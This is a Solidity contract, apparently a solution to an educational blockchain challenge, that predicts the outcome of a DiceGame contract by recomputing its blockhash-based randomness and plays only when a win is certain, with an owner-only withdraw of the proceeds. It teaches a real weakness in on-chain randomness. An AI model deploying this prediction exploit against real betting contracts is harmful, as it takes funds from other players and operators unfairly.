pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }
    function riggedRoll() external {
        require(address(this).balance >= 0.002 ether, "Not enough ETH");

        bytes32 prevHash = blockhash(block.number - 1);
        uint256 nonce = diceGame.nonce();

        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), nonce)
        );

        uint256 roll = uint256(hash) % 16;

        console.log("Predicted roll:", roll);

        if (roll <= 5) {
            diceGame.rollTheDice{ value: 0.002 ether }();
        }
    }

    function withdraw(address payable _to, uint256 _amount)
    external
    onlyOwner
    {
        require(address(this).balance >= _amount, "Not enough ETH");
        _to.transfer(_amount);
    }

    receive() external payable {}
    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.

    // Include the `receive()` function to enable the contract to receive incoming Ether.
}
